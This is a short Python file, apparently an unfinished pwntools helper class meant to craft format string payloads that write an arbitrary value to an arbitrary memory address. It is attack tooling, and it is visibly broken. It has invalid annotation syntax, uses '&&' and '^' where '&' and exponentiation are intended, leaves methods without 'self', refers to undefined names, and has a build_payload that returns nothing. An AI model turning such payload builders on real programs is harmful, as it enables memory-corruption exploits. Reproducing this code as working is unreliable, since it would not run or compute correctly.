'''
format_sring.py

Used to craft payloads for format string vulnerabilities

#TODO: add ability for auto detection an try to inject ourselves
'''
import pwn

class FormatString:
  def __init__(self, arch='amd64' : string):
    context.arch = arch
    self.arch = arch
    self.endian = context.endian
    self.bit_size = context.bits

  def build_payload(address : int, value : int):
    """ Builds a format string payload to be injected
        
        Sets the address to the value given
        #TODO: add the possibilty of injecting into the format string payload
        
        """
    step_size = 2
    location = 2
    format_specifier = self._build_format_string(location, value)
    address = self._build_addresses(address, step_size)


  def _build_format_string(self, format_location : int, value : int, step_size : int):
    """ Builds the format string that allows for the injection
        """
    mask = (2 ^ (8 * step_size) - 1) # Applies a mask to grab bytes

    format_string = ''
    for i in range(self.bit_size // 8):
      format_int = mask && value
      value = value >> step_size
      format_string += f'%{format_int}c%{format_location+i}$hn'
    
    return format_string.encode('utf-8')

  def _build_addresses(address : int, step_size=2 : int):
    """ Builds the addresses that the format string pulls from
        """
    address_count = self.bit_size // (8 * step_size) # Calculate how many addresses are required
  
    addresses = []
    address_int = int.from_bytes(address, endian)
    for i in range(address_count):
      next_address_int = address_int + (i * step_size) 
      next_address = next_address_int.to_bytes(16, endian)
      addresses.append(next_address)
  
    return b''.join(addresses)


